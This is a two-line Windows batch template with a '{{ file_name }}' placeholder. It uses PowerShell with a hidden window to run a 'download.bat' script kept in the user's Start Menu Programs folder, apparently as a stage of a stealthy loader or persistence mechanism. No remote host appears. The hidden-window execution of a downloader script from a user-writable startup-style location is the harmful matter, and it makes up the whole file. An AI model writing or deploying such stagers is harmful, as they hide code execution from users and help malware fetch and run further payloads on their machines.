@echo off
powershell -windowstyle hidden -command "cmd /c '%appdata%\Microsoft\Windows\Start Menu\Programs\{{ file_name }}\download.bat'"
